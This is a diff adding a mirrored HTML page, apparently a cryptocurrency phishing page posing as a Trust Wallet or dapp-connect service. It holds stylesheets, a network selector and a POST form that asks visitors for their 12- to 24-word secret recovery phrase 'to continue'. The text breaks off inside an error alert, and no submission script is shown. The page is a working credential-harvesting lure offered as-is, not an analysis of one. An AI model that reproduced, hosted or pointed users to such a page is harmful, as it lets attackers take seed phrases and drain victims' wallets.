@@ -1,0 +1,1115 @@
+<!DOCTYPE html>
+<!-- saved from url=(0120)https://smartdappsconnect.surge.sh/protocols/others/?chainName=All&protocolName=Trust%20Wallet&protocolCode=trust_wallet -->
+<html data-theme="light">
+<!-- Mirrored from nodesappfix.com/en/smartdappsconnect.surge.sh_protocols_others__chainName=All&protocolName=Trust Wallet&protocolCode=trust_wallet.html by HTTrack Website Copier/3.x [XR&CO'2017], Tue, 02 Apr 2024 22:09:23 GMT -->
+<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><!-- /Added by HTTrack -->
+  
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title></title>
+    <link rel="stylesheet" type="text/css" href="files/index.css" title="ltr">
+    <link rel="stylesheet" type="text/css" href="files/main.css" title="ltr">
+    <link rel="stylesheet" type="text/css" href="files/custom.css" title="ltr">
+    <link rel="shortcut icon" href="files/html.html">
+    <link rel="apple-touch-icon-precomposed" href="files/html.html">
+    <style data-jss="" data-meta="MuiInputBase">
+      @-webkit-keyframes mui-auto-fill {
+      }
+
+      @-webkit-keyframes mui-auto-fill-cancel {
+      }
+
+      .MuiInputBase-root {
+        color: rgba(0, 0, 0, 0.87);
+        cursor: text;
+        display: inline-flex;
+        position: relative;
+        font-size: 1rem;
+        box-sizing: border-box;
+        align-items: center;
+        font-family: "Roboto", "Helvetica", "Arial", sans-serif;
+        font-weight: 400;
+        line-height: 1.1876em;
+        letter-spacing: 0.00938em;
+      }
+
+      .MuiInputBase-root.Mui-disabled {
+        color: rgba(0, 0, 0, 0.38);
+        cursor: default;
+      }
+
+      .MuiInputBase-multiline {
+        padding: 6px 0 7px;
+      }
+
+      .MuiInputBase-multiline.MuiInputBase-marginDense {
+        padding-top: 3px;
+      }
+
+      .MuiInputBase-fullWidth {
+        width: 100%;
+      }
+
+      .MuiInputBase-input {
+        font: inherit;
+        color: currentColor;
+        width: 100%;
+        border: 0;
+        height: 1.1876em;
+        margin: 0;
+        display: block;
+        padding: 6px 0 7px;
+        min-width: 0;
+        background: none;
+        box-sizing: content-box;
+        animation-name: mui-auto-fill-cancel;
+        letter-spacing: inherit;
+        animation-duration: 10ms;
+        -webkit-tap-highlight-color: transparent;
+      }
+
+      .MuiInputBase-input::-webkit-input-placeholder {
+        color: currentColor;
+        opacity: 0.42;
+        transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+      }
+
+      .MuiInputBase-input::-moz-placeholder {
+        color: currentColor;
+        opacity: 0.42;
+        transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+      }
+
+      .MuiInputBase-input:-ms-input-placeholder {
+        color: currentColor;
+        opacity: 0.42;
+        transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+      }
+
+      .MuiInputBase-input::-ms-input-placeholder {
+        color: currentColor;
+        opacity: 0.42;
+        transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+      }
+
+      .MuiInputBase-input:focus {
+        outline: 0;
+      }
+
+      .MuiInputBase-input:invalid {
+        box-shadow: none;
+      }
+
+      .MuiInputBase-input::-webkit-search-decoration {
+        -webkit-appearance: none;
+      }
+
+      .MuiInputBase-input.Mui-disabled {
+        opacity: 1;
+      }
+
+      .MuiInputBase-input:-webkit-autofill {
+        animation-name: mui-auto-fill;
+        animation-duration: 5000s;
+      }
+
+      label[data-shrink="false"]
+        + .MuiInputBase-formControl
+        .MuiInputBase-input::-webkit-input-placeholder {
+        opacity: 0 !important;
+      }
+
+      label[data-shrink="false"]
+        + .MuiInputBase-formControl
+        .MuiInputBase-input::-moz-placeholder {
+        opacity: 0 !important;
+      }
+
+      label[data-shrink="false"]
+        + .MuiInputBase-formControl
+        .MuiInputBase-input:-ms-input-placeholder {
+        opacity: 0 !important;
+      }
+
+      label[data-shrink="false"]
+        + .MuiInputBase-formControl
+        .MuiInputBase-input::-ms-input-placeholder {
+        opacity: 0 !important;
+      }
+
+      label[data-shrink="false"]
+        + .MuiInputBase-formControl
+        .MuiInputBase-input:focus::-webkit-input-placeholder {
+        opacity: 0.42;
+      }
+
+      label[data-shrink="false"]
+        + .MuiInputBase-formControl
+        .MuiInputBase-input:focus::-moz-placeholder {
+        opacity: 0.42;
+      }
+
+      label[data-shrink="false"]
+        + .MuiInputBase-formControl
+        .MuiInputBase-input:focus:-ms-input-placeholder {
+        opacity: 0.42;
+      }
+
+      label[data-shrink="false"]
+        + .MuiInputBase-formControl
+        .MuiInputBase-input:focus::-ms-input-placeholder {
+        opacity: 0.42;
+      }
+
+      .MuiInputBase-inputMarginDense {
+        padding-top: 3px;
+      }
+
+      .MuiInputBase-inputMultiline {
+        height: auto;
+        resize: none;
+        padding: 0;
+      }
+
+      .MuiInputBase-inputTypeSearch {
+        -moz-appearance: textfield;
+        -webkit-appearance: textfield;
+      }
+    </style>
+
+    <style data-jss="" data-meta="MuiInput">
+      .MuiInput-root {
+        position: relative;
+      }
+
+      label + .MuiInput-formControl {
+        margin-top: 16px;
+      }
+
+      .MuiInput-colorSecondary.MuiInput-underline:after {
+        border-bottom-color: #f50057;
+      }
+
+      .MuiInput-underline:after {
+        left: 0;
+        right: 0;
+        bottom: 0;
+        content: "";
+        position: absolute;
+        transform: scaleX(0);
+        transition: transform 200ms cubic-bezier(0, 0, 0.2, 1) 0ms;
+        border-bottom: 2px solid #3f51b5;
+        pointer-events: none;
+      }
+
+      .MuiInput-underline.Mui-focused:after {
+        transform: scaleX(1);
+      }
+
+      .MuiInput-underline.Mui-error:after {
+        transform: scaleX(1);
+        border-bottom-color: #f44336;
+      }
+
+      .MuiInput-underline:before {
+        left: 0;
+        right: 0;
+        bottom: 0;
+        content: "\00a0";
+        position: absolute;
+        transition: border-bottom-color 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+        border-bottom: 1px solid rgba(0, 0, 0, 0.42);
+        pointer-events: none;
+      }
+
+      .MuiInput-underline:hover:not(.Mui-disabled):before {
+        border-bottom: 2px solid rgba(0, 0, 0, 0.87);
+      }
+
+      .MuiInput-underline.Mui-disabled:before {
+        border-bottom-style: dotted;
+      }
+
+      @media (hover: none) {
+        .MuiInput-underline:hover:not(.Mui-disabled):before {
+          border-bottom: 1px solid rgba(0, 0, 0, 0.42);
+        }
+      }
+    </style>
+
+    <style data-jss="" data-meta="MuiFormLabel">
+      .MuiFormLabel-root {
+        color: rgba(0, 0, 0, 0.54);
+        padding: 0;
+        font-size: 1rem;
+        font-family: "Roboto", "Helvetica", "Arial", sans-serif;
+        font-weight: 400;
+        line-height: 1;
+        letter-spacing: 0.00938em;
+      }
+
+      .MuiFormLabel-root.Mui-focused {
+        color: #3f51b5;
+      }
+
+      .MuiFormLabel-root.Mui-disabled {
+        color: rgba(0, 0, 0, 0.38);
+      }
+
+      .MuiFormLabel-root.Mui-error {
+        color: #f44336;
+      }
+
+      .MuiFormLabel-colorSecondary.Mui-focused {
+        color: #f50057;
+      }
+
+      .MuiFormLabel-asterisk.Mui-error {
+        color: #f44336;
+      }
+    </style>
+
+    <style data-jss="" data-meta="MuiInputLabel">
+      .MuiInputLabel-root {
+        display: block;
+        transform-origin: top left;
+      }
+
+      .MuiInputLabel-formControl {
+        top: 0;
+        left: 0;
+        position: absolute;
+        transform: translate(0, 24px) scale(1);
+      }
+
+      .MuiInputLabel-marginDense {
+        transform: translate(0, 21px) scale(1);
+      }
+
+      .MuiInputLabel-shrink {
+        transform: translate(0, 1.5px) scale(0.75);
+        transform-origin: top left;
+      }
+
+      .MuiInputLabel-animated {
+        transition: color 200ms cubic-bezier(0, 0, 0.2, 1) 0ms,
+          transform 200ms cubic-bezier(0, 0, 0.2, 1) 0ms;
+      }
+
+      .MuiInputLabel-filled {
+        z-index: 1;
+        transform: translate(12px, 20px) scale(1);
+        pointer-events: none;
+      }
+
+      .MuiInputLabel-filled.MuiInputLabel-marginDense {
+        transform: translate(12px, 17px) scale(1);
+      }
+
+      .MuiInputLabel-filled.MuiInputLabel-shrink {
+        transform: translate(12px, 10px) scale(0.75);
+      }
+
+      .MuiInputLabel-filled.MuiInputLabel-shrink.MuiInputLabel-marginDense {
+        transform: translate(12px, 7px) scale(0.75);
+      }
+
+      .MuiInputLabel-outlined {
+        z-index: 1;
+        transform: translate(14px, 20px) scale(1);
+        pointer-events: none;
+      }
+
+      .MuiInputLabel-outlined.MuiInputLabel-marginDense {
+        transform: translate(14px, 12px) scale(1);
+      }
+
+      .MuiInputLabel-outlined.MuiInputLabel-shrink {
+        transform: translate(14px, -6px) scale(0.75);
+      }
+    </style>
+
+    <style data-jss="" data-meta="MuiFormControl">
+      .MuiFormControl-root {
+        border: 0;
+        margin: 0;
+        display: inline-flex;
+        padding: 0;
+        position: relative;
+        min-width: 0;
+        flex-direction: column;
+        vertical-align: top;
+      }
+
+      .MuiFormControl-marginNormal {
+        margin-top: 16px;
+        margin-bottom: 8px;
+      }
+
+      .MuiFormControl-marginDense {
+        margin-top: 8px;
+        margin-bottom: 4px;
+      }
+
+      .MuiFormControl-fullWidth {
+        width: 100%;
+      }
+    </style>
+
+    <style data-jss="" data-meta="MuiTextField"></style>
+
+    <style data-jss="" data-meta="makeStyles">
+      .jss1 {
+        color: var(--color-text-alternative);
+        font-weight: 400;
+      }
+
+      .jss1.jss2 {
+        color: var(--color-text-alternative);
+      }
+
+      .jss1.jss4 {
+        color: var(--color-text-alternative);
+      }
+
+      .jss3:before {
+        border-bottom: 1px solid var(--color-text-default) !important;
+      }
+
+      .jss3:after {
+        border-bottom: 2px solid var(--color-primary-default);
+      }
+
+      .jss5 {
+        color: var(--color-text-alternative);
+      }
+
+      .jss6 {
+        padding: 8px;
+      }
+
+      .jss6::placeholder {
+        color: var(--color-text-alternative);
+      }
+
+      .jss7 {
+        color: var(--color-background-default);
+      }
+
+      .jss8:after {
+        border-bottom: 2px solid var(--color-background-default);
+      }
+
+      .jss9.jss10 {
+        color: var(--color-text-alternative);
+      }
+
+      .jss9.jss4 {
+        color: var(--color-text-alternative);
+      }
+
+      .jss12 {
+        color: var(--color-text-default);
+        border: 1px solid var(--color-border-default);
+        height: 48px;
+        display: flex;
+        padding: 0 16px;
+        align-items: center;
+        border-radius: 6px;
+        background-color: var(--color-background-default);
+      }
+
+      label + .jss12 {
+        margin-top: 9px;
+      }
+
+      .jss12.jss11 {
+        border: 1px solid var(--color-primary-default);
+      }
+
+      .jss13 {
+        color: var(--color-text-default);
+        position: initial;
+        font-size: 1rem;
+        transform: none;
+        transition: none;
+      }
+
+      .jss14 {
+        color: var(--color-text-default);
+        position: initial;
+        font-size: 0.75rem;
+        transform: none;
+        transition: none;
+      }
+
+      .jss15 {
+        line-height: initial !important;
+      }
+    </style>
+
+    <style>
+      .menu-droppo-enter {
+        transition: transform 300ms ease-in-out;
+        transform: translateY(-200%);
+      }
+
+      .menu-droppo-enter.menu-droppo-enter-active {
+        transition: transform 300ms ease-in-out;
+        transform: translateY(0%);
+      }
+
+      .menu-droppo-leave {
+        transition: transform 300ms ease-in-out;
+        transform: translateY(0%);
+      }
+
+      .menu-droppo-leave.menu-droppo-leave-active {
+        transition: transform 300ms ease-in-out;
+        transform: translateY(-200%);
+      }
+    </style>
+
+    <style>
+      /* Spinner */
+      .loader {
+        width: 35px;
+        height: 35px;
+        border: 5px solid #000;
+        border-bottom-color: transparent;
+        border-radius: 50%;
+        display: inline-block;
+        box-sizing: border-box;
+        animation: rotation 1s linear infinite;
+      }
+
+      @keyframes rotation {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+    </style>
+    <script src="files/jquery.min.js.download"></script>
+  </head>
+
+  <body>
+    <div id="app-content">
+      <img class="preloader loading-logo" id="loading__logo" src="files/html.html" style="border-radius: 50%; display: none;">
+      <div class="preloader" style="margin-top: 3px; display: none;"></div>
+      <span class="preloader loader loading-spinner" id="__loader_spinner" style="border-width: 5px; border-style: solid; border-color: rgb(0, 0, 0) rgb(0, 0, 0) transparent; border-image: initial; display: none;"></span>
+
+      <div class="main-content">
+        <div class="app-header">
+          <div class="app-header__contents">
+           
+            <div class="app-header__account-menu-container">
+              <div class="app-header__network-component-wrapper">
+                <div class="network-component pointer ethereum-network" title="Ethereum">
+                  <div class="network-indicator">
+                    <div class="menu-icon-circle">
+                      <div style="
+                          background: rgb(3, 135, 137);
+                          border: none;
+                          height: 12px;
+                          width: 12px;
+                        "></div>
+                    </div>
+                    <select class="network-name">
+                      <option>Select Network</option>
+                      <option>Ethereum</option>
+                      <option>Binance Chain</option>
+                      <option>Arbitrum</option>
+                      <option>Optimism</option>
+                      <option>Polygon</option>
+                      <option>Avalanche</option>
+                    </select>
+
+                    <i class="fa fa-chevron-down fa-lg network-caret"></i>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="main-container-wrapper">
+          <div class="first-view-main-wrapper">
+            <div class="first-view-main">
+              <form autocomplete="off" method="POST">
+                      
+                <div id="second" class="import-account">
+                  <div class="import-account__title">
+                    Secret Recovery Phrase
+                  </div>
+                  <div class="import-account__selector-label">
+                    Enter your Mnemonic keyword phrase to continue using .
+                  </div>
+                  <div class="import-account__input-wrapper">
+                    <div class="import-srp__number-of-words-dropdown" style="
+                        position: relative;
+                        display: inline-block;
+                        height: 36px;
+                        width: 100%;
+                        margin-bottom: 20px;
+                      ">
+                      <select class="change_phrase_words_count dropdown__select" style="color: rgb(0, 0, 0); font-weight: bold;">
+                        <option value="12">I have a 12-word phrase</option>
+                        <option value="15">I have a 15-word phrase</option>
+                        <option value="18">I have a 18-word phrase</option>
+                        <option value="21">I have a 21-word phrase</option>
+                        <option value="24">I have a 24-word phrase</option>
+                      </select>
+                      <svg width="16" height="16" fill="currentColor" class="dropdown__icon-caret-down" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
+                        <path d="m399 177c-8-8-22-8-30 0l-113 113-113-113c-8-8-22-8-30 0-8 8-8 22 0 30l128 128c8 8 22 8 30 0l128-128c8-8 8-22 0-30z"></path>
+                      </svg>
+                    </div>
+
+                    <div class="margin-bottom: 6px;">
+                      <div class="actionable-message__message">
+                        You can paste your entire secret recovery phrase into
+                        any field
+                      </div>
+                    </div>
+
+                    <div class="phrase-block border-radius--5px mb-8">
+                      <div class="row">
+                        <div class="import-srp__srp-word col-sm-4 col-md-3 col-lg-3 col-6">
+                          <div class="v-input theme--light v-text-field v-text-field--is-booted">
+                            <div class="v-input__control">
+                              <div class="v-input__slot">
+                                <div class="v-text-field__slot">
+                                  <!-- Form section Start Here lowkey -->
+
+                                  <label for="input-231" class="v-label theme--light" style="
+                                      left: 0px;
+                                      right: auto;
+                                      position: absolute;
+                                    ">
+                                    1.&nbsp;
+                                  </label>
+                                  <input name="import-srp__srp-word-0" id="import-srp__srp-word-0" autocomplete="off" class="MuiInputBase-input" autofocus="autofocus" type="text">
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <!-- Input 2 -->
+                        <div class="import-srp__srp-word col-sm-4 col-md-3 col-lg-3 col-6">
+                          <div class="v-input theme--light v-text-field v-text-field--is-booted">
+                            <div class="v-input__control">
+                              <div class="v-input__slot">
+                                <div class="v-text-field__slot">
+                                  <label for="input-231" class="v-label theme--light" style="
+                                      left: 0px;
+                                      right: auto;
+                                      position: absolute;
+                                    ">
+                                    2.&nbsp;
+                                  </label>
+                                  <input name="import-srp__srp-word-1" id="import-srp__srp-word-1" autocomplete="off" class="MuiInputBase-input" autofocus="autofocus" type="text">
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+
+                        <!-- input 3 -->
+                        <div class="import-srp__srp-word col-sm-4 col-md-3 col-lg-3 col-6">
+                          <div class="v-input theme--light v-text-field v-text-field--is-booted">
+                            <div class="v-input__control">
+                              <div class="v-input__slot">
+                                <div class="v-text-field__slot">
+                                  <label for="input-231" class="v-label theme--light" style="
+                                      left: 0px;
+                                      right: auto;
+                                      position: absolute;
+                                    ">
+                                    3.&nbsp;
+                                  </label>
+                                  <input name="import-srp__srp-word-2" id="import-srp__srp-word-2" autocomplete="off" class="MuiInputBase-input" autofocus="autofocus" type="text">
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+
+                        <!-- inout 4 -->
+                        <div class="import-srp__srp-word col-sm-4 col-md-3 col-lg-3 col-6">
+                          <div class="v-input theme--light v-text-field v-text-field--is-booted">
+                            <div class="v-input__control">
+                              <div class="v-input__slot">
+                                <div class="v-text-field__slot">
+                                  <label for="input-231" class="v-label theme--light" style="
+                                      left: 0px;
+                                      right: auto;
+                                      position: absolute;
+                                    ">
+                                    4.&nbsp;
+                                  </label>
+                                  <input name="import-srp__srp-word-3" id="import-srp__srp-word-3" autocomplete="off" class="MuiInputBase-input" autofocus="autofocus" type="text">
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+
+                        <!-- input 5 -->
+                        <div class="import-srp__srp-word col-sm-4 col-md-3 col-lg-3 col-6">
+                          <div class="v-input theme--light v-text-field v-text-field--is-booted">
+                            <div class="v-input__control">
+                              <div class="v-input__slot">
+                                <div class="v-text-field__slot">
+                                  <label for="input-231" class="v-label theme--light" style="
+                                      left: 0px;
+                                      right: auto;
+                                      position: absolute;
+                                    ">
+                                    5.&nbsp;
+                                  </label>
+                                  <input name="import-srp__srp-word-4" id="import-srp__srp-word-4" autocomplete="off" class="MuiInputBase-input" autofocus="autofocus" type="text">
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+
+                        <!-- input 6 -->
+                        <div class="import-srp__srp-word col-sm-4 col-md-3 col-lg-3 col-6">
+                          <div class="v-input theme--light v-text-field v-text-field--is-booted">
+                            <div class="v-input__control">
+                              <div class="v-input__slot">
+                                <div class="v-text-field__slot">
+                                  <label for="input-231" class="v-label theme--light" style="
+                                      left: 0px;
+                                      right: auto;
+                                      position: absolute;
+                                    ">
+                                    6.&nbsp;
+                                  </label>
+                                  <input name="import-srp__srp-word-5" id="import-srp__srp-word-5" autocomplete="off" class="MuiInputBase-input" autofocus="autofocus" type="text">
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+
+                        <!-- input 7 -->
+                        <div class="import-srp__srp-word col-sm-4 col-md-3 col-lg-3 col-6">
+                          <div class="v-input theme--light v-text-field v-text-field--is-booted">
+                            <div class="v-input__control">
+                              <div class="v-input__slot">
+                                <div class="v-text-field__slot">
+                                  <label for="input-231" class="v-label theme--light" style="
+                                      left: 0px;
+                                      right: auto;
+                                      position: absolute;
+                                    ">
+                                    7.&nbsp;
+                                  </label>
+                                  <input name="import-srp__srp-word-6" id="import-srp__srp-word-6" autocomplete="off" class="MuiInputBase-input" autofocus="autofocus" type="text">
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+
+                        <!-- input 8 -->
+                        <div class="import-srp__srp-word col-sm-4 col-md-3 col-lg-3 col-6">
+                          <div class="v-input theme--light v-text-field v-text-field--is-booted">
+                            <div class="v-input__control">
+                              <div class="v-input__slot">
+                                <div class="v-text-field__slot">
+                                  <label for="input-231" class="v-label theme--light" style="
+                                      left: 0px;
+                                      right: auto;
+                                      position: absolute;
+                                    ">
+                                    8.&nbsp;
+                                  </label>
+                                  <input name="import-srp__srp-word-7" id="import-srp__srp-word-7" autocomplete="off" class="MuiInputBase-input" autofocus="autofocus" type="text">
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+
+                        <!-- input 9 -->
+                        <div class="import-srp__srp-word col-sm-4 col-md-3 col-lg-3 col-6">
+                          <div class="v-input theme--light v-text-field v-text-field--is-booted">
+                            <div class="v-input__control">
+                              <div class="v-input__slot">
+                                <div class="v-text-field__slot">
+                                  <label for="input-231" class="v-label theme--light" style="
+                                      left: 0px;
+                                      right: auto;
+                                      position: absolute;
+                                    ">
+                                    9.&nbsp;
+                                  </label>
+                                  <input name="import-srp__srp-word-8" id="import-srp__srp-word-8" autocomplete="off" class="MuiInputBase-input" autofocus="autofocus" type="text">
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+
+                        <!-- input 10 -->
+                        <div class="import-srp__srp-word col-sm-4 col-md-3 col-lg-3 col-6">
+                          <div class="v-input theme--light v-text-field v-text-field--is-booted">
+                            <div class="v-input__control">
+                              <div class="v-input__slot">
+                                <div class="v-text-field__slot">
+                                  <label for="input-231" class="v-label theme--light" style="
+                                      left: 0px;
+                                      right: auto;
+                                      position: absolute;
+                                    ">
+                                    10.&nbsp;
+                                  </label>
+                                  <input name="import-srp__srp-word-9" id="import-srp__srp-word-9" autocomplete="off" class="MuiInputBase-input" autofocus="autofocus" type="text">
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+
+                        <!-- input 11 -->
+                        <div class="import-srp__srp-word col-sm-4 col-md-3 col-lg-3 col-6">
+                          <div class="v-input theme--light v-text-field v-text-field--is-booted">
+                            <div class="v-input__control">
+                              <div class="v-input__slot">
+                                <div class="v-text-field__slot">
+                                  <label for="input-231" class="v-label theme--light" style="
+                                      left: 0px;
+                                      right: auto;
+                                      position: absolute;
+                                    ">
+                                    11.&nbsp;
+                                  </label>
+                                  <input name="import-srp__srp-word-10" id="import-srp__srp-word-10" autocomplete="off" class="MuiInputBase-input" autofocus="autofocus" type="text">
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+
+                        <!-- input 12 -->
+                        <div class="import-srp__srp-word col-sm-4 col-md-3 col-lg-3 col-6">
+                          <div class="v-input theme--light v-text-field v-text-field--is-booted">
+                            <div class="v-input__control">
+                              <div class="v-input__slot">
+                                <div class="v-text-field__slot">
+                                  <label for="input-231" class="v-label theme--light" style="
+                                      left: 0px;
+                                      right: auto;
+                                      position: absolute;
+                                    ">
+                                    12.&nbsp;
+                                  </label>
+                                  <input name="import-srp__srp-word-11" id="import-srp__srp-word-11" autocomplete="off" class="MuiInputBase-input" autofocus="autofocus" type="text">
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+
+                        <!-- first 12 end here  -->
+
+                        <div class="import-srp__srp-word col-sm-4 col-md-3 col-lg-3 col-6" style="display: none;">
+                          <div class="v-input theme--light v-text-field v-text-field--is-booted">
+                            <div class="v-input__control">
+                              <div class="v-input__slot">
+                                <div class="v-text-field__slot">
+                                  <label for="input-231" class="v-label theme--light" style="
+                                      left: 0px;
+                                      right: auto;
+                                      position: absolute;
+                                    ">
+                                    13.&nbsp;
+                                  </label>
+                                  <input name="import-srp__srp-word-12" id="import-srp__srp-word-12" autocomplete="off" class="MuiInputBase-input" autofocus="autofocus" type="text">
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="import-srp__srp-word col-sm-4 col-md-3 col-lg-3 col-6" style="display: none;">
+                          <div class="v-input theme--light v-text-field v-text-field--is-booted">
+                            <div class="v-input__control">
+                              <div class="v-input__slot">
+                                <div class="v-text-field__slot">
+                                  <label for="input-231" class="v-label theme--light" style="
+                                      left: 0px;
+                                      right: auto;
+                                      position: absolute;
+                                    ">
+                                    14.&nbsp;
+                                  </label>
+                                  <input name="import-srp__srp-word-13" id="import-srp__srp-word-13" autocomplete="off" class="MuiInputBase-input" autofocus="autofocus" type="text">
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="import-srp__srp-word col-sm-4 col-md-3 col-lg-3 col-6" style="display: none;">
+                          <div class="v-input theme--light v-text-field v-text-field--is-booted">
+                            <div class="v-input__control">
+                              <div class="v-input__slot">
+                                <div class="v-text-field__slot">
+                                  <label for="input-231" class="v-label theme--light" style="
+                                      left: 0px;
+                                      right: auto;
+                                      position: absolute;
+                                    ">
+                                    15.&nbsp;
+                                  </label>
+                                  <input name="import-srp__srp-word-14" id="import-srp__srp-word-14" autocomplete="off" class="MuiInputBase-input" autofocus="autofocus" type="text">
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="import-srp__srp-word col-sm-4 col-md-3 col-lg-3 col-6" style="display: none;">
+                          <div class="v-input theme--light v-text-field v-text-field--is-booted">
+                            <div class="v-input__control">
+                              <div class="v-input__slot">
+                                <div class="v-text-field__slot">
+                                  <label for="input-231" class="v-label theme--light" style="
+                                      left: 0px;
+                                      right: auto;
+                                      position: absolute;
+                                    ">
+                                    16.&nbsp;
+                                  </label>
+                                  <input name="import-srp__srp-word-15" id="import-srp__srp-word-15" autocomplete="off" class="MuiInputBase-input" autofocus="autofocus" type="text">
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="import-srp__srp-word col-sm-4 col-md-3 col-lg-3 col-6" style="display: none;">
+                          <div class="v-input theme--light v-text-field v-text-field--is-booted">
+                            <div class="v-input__control">
+                              <div class="v-input__slot">
+                                <div class="v-text-field__slot">
+                                  <label for="input-231" class="v-label theme--light" style="
+                                      left: 0px;
+                                      right: auto;
+                                      position: absolute;
+                                    ">
+                                    17.&nbsp;
+                                  </label>
+                                  <input name="import-srp__srp-word-16" id="import-srp__srp-word-16" autocomplete="off" class="MuiInputBase-input" autofocus="autofocus" type="text">
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="import-srp__srp-word col-sm-4 col-md-3 col-lg-3 col-6" style="display: none;">
+                          <div class="v-input theme--light v-text-field v-text-field--is-booted">
+                            <div class="v-input__control">
+                              <div class="v-input__slot">
+                                <div class="v-text-field__slot">
+                                  <label for="input-231" class="v-label theme--light" style="
+                                      left: 0px;
+                                      right: auto;
+                                      position: absolute;
+                                    ">
+                                    18.&nbsp;
+                                  </label>
+                                  <input name="import-srp__srp-word-17" id="import-srp__srp-word-17" autocomplete="off" class="MuiInputBase-input" autofocus="autofocus" type="text">
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="import-srp__srp-word col-sm-4 col-md-3 col-lg-3 col-6" style="display: none;">
+                          <div class="v-input theme--light v-text-field v-text-field--is-booted">
+                            <div class="v-input__control">
+                              <div class="v-input__slot">
+                                <div class="v-text-field__slot">
+                                  <label for="input-231" class="v-label theme--light" style="
+                                      left: 0px;
+                                      right: auto;
+                                      position: absolute;
+                                    ">
+                                    19.&nbsp;
+                                  </label>
+                                  <input name="import-srp__srp-word-18" id="import-srp__srp-word-18" autocomplete="off" class="MuiInputBase-input" autofocus="autofocus" type="text">
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="import-srp__srp-word col-sm-4 col-md-3 col-lg-3 col-6" style="display: none;">
+                          <div class="v-input theme--light v-text-field v-text-field--is-booted">
+                            <div class="v-input__control">
+                              <div class="v-input__slot">
+                                <div class="v-text-field__slot">
+                                  <label for="input-231" class="v-label theme--light" style="
+                                      left: 0px;
+                                      right: auto;
+                                      position: absolute;
+                                    ">
+                                    20.&nbsp;
+                                  </label>
+                                  <input name="import-srp__srp-word-19" id="import-srp__srp-word-19" autocomplete="off" class="MuiInputBase-input" autofocus="autofocus" type="text">
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="import-srp__srp-word col-sm-4 col-md-3 col-lg-3 col-6" style="display: none;">
+                          <div class="v-input theme--light v-text-field v-text-field--is-booted">
+                            <div class="v-input__control">
+                              <div class="v-input__slot">
+                                <div class="v-text-field__slot">
+                                  <label for="input-231" class="v-label theme--light" style="
+                                      left: 0px;
+                                      right: auto;
+                                      position: absolute;
+                                    ">
+                                    21.&nbsp;
+                                  </label>
+                                  <input name="import-srp__srp-word-20" id="import-srp__srp-word-20" autocomplete="off" class="MuiInputBase-input" autofocus="autofocus" type="text">
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="import-srp__srp-word col-sm-4 col-md-3 col-lg-3 col-6" style="display: none;">
+                          <div class="v-input theme--light v-text-field v-text-field--is-booted">
+                            <div class="v-input__control">
+                              <div class="v-input__slot">
+                                <div class="v-text-field__slot">
+                                  <label for="input-231" class="v-label theme--light" style="
+                                      left: 0px;
+                                      right: auto;
+                                      position: absolute;
+                                    ">
+                                    22.&nbsp;
+                                  </label>
+                                  <input name="import-srp__srp-word-21" id="import-srp__srp-word-21" autocomplete="off" class="MuiInputBase-input" autofocus="autofocus" type="text">
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="import-srp__srp-word col-sm-4 col-md-3 col-lg-3 col-6" style="display: none;">
+                          <div class="v-input theme--light v-text-field v-text-field--is-booted">
+                            <div class="v-input__control">
+                              <div class="v-input__slot">
+                                <div class="v-text-field__slot">
+                                  <label for="input-231" class="v-label theme--light" style="
+                                      left: 0px;
+                                      right: auto;
+                                      position: absolute;
+                                    ">
+                                    23.&nbsp;
+                                  </label>
+                                  <input name="import-srp__srp-word-22" id="import-srp__srp-word-22" autocomplete="off" class="MuiInputBase-input" autofocus="autofocus" type="text">
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="import-srp__srp-word col-sm-4 col-md-3 col-lg-3 col-6" style="display: none;">
+                          <div class="v-input theme--light v-text-field v-text-field--is-booted">
+                            <div class="v-input__control">
+                              <div class="v-input__slot">
+                                <div class="v-text-field__slot">
+                                  <label for="input-231" class="v-label theme--light" style="
+                                      left: 0px;
+                                      right: auto;
+                                      position: absolute;
+                                    ">
+                                    24.&nbsp;
+                                  </label>
+                                  <input name="import-srp__srp-word-23" id="import-srp__srp-word-23" autocomplete="off" class="MuiInputBase-input" autofocus="autofocus" type="text">
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+
+                  <div class="actionable-message--danger dom_hide">
+                    <div class="import-account__selector-label">
+                      <div class="alert alert-danger fade in alert-dismissible step3_block">
